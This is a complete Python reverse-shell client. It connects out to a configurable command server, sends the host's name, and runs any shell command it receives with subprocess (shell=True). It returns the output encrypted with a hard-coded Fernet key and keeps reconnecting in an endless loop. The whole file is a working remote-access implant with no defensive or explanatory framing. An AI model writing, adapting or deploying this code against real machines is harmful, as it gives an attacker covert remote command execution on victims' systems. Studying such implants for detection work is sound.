import os
import socket
import subprocess
import time
import signal
import sys
import struct

import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class Client(object):

    def __init__(self):
        self.serverHost = '127.0.0.1'
        self.serverPort = 9999
        self.socket = None
        # Generate Key
        # key = Fernet.generate_key()

        key = b'k_1i71JWlLTHt8N185PUXjFFzu27DnEH2sXNy-aoG30='
        self.Crypt = Fernet(key)

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        sys.exit(0)
        return

    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("Socket creation error" + str(e))
            return
        return

    def socket_connect(self):
        """ Connect to a remote socket """
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print("Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            encrypted_host = self.Crypt.encrypt(socket.gethostname().encode(encoding="utf-8")).decode(encoding="utf-8")
            self.socket.send(str.encode(encrypted_host))
        except socket.error as e:
            print("Cannot send hostname to server: " + str(e))
            raise
        return

    def print_output(self, output_str):
        """ Prints command output """
        sent_message = str.encode(self.Crypt.encrypt((output_str + str(os.getcwd()) + '> ').encode(encoding='utf-8')).decode())
        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        print(output_str)
        return

    def receive_commands(self):
        """ Receive commands from remote server and run on local machine """
        try:
            self.socket.recv(10)
        except Exception as e:
            print('Could not start communication with server: %s\n' %str(e))
            return
        cwd = str.encode(self.Crypt.encrypt(str(os.getcwd() + '> ').encode()).decode())
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b'':
                break
            data = self.Crypt.decrypt(data)
            if data[:2].decode("utf-8") == 'cd':
                directory = data[3:].decode("utf-8")
                try:
                    os.chdir(directory.strip())
                except Exception as e:
                    output_str = "Could not change directory: %s\n" %str(e)
                else: 
                    output_str = ""
            elif data[:].decode("utf-8") == 'quit':
                self.socket.close()
                break
            elif len(data) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors="replace")
                except Exception as e:
                    # TODO: Error description is lost
                    output_str = "Command execution unsuccessful: %s\n" %str(e)
            if output_str is not None:
                try:
                    self.print_output(output_str)
                except Exception as e:
                    print('Cannot send command output: %s' %str(e))
        self.socket.close()
        return


def main():
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            print("Error on socket connections: %s" %str(e))
            time.sleep(5)     
        else:
            break    
    try:
        client.receive_commands()
    except Exception as e:
        print('Error in main: ' + str(e))
    client.socket.close()
    return


if __name__ == '__main__':
    while True:
        main()